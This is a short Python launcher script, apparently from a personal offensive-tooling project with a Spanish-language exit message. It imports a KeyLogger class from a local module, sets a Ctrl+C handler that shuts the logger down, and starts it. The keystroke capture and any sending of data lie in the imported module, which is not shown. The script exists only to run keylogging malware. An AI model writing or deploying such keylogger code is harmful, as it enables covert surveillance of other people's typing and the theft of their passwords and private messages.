#!/bin/python3

from keylogger import KeyLogger
import signal
from termcolor import colored
import sys

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo del programa......\n", "red"))
    my_keylogger.shutdown()
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


if __name__ == "__main__":
    my_keylogger = KeyLogger()
    my_keylogger.start()
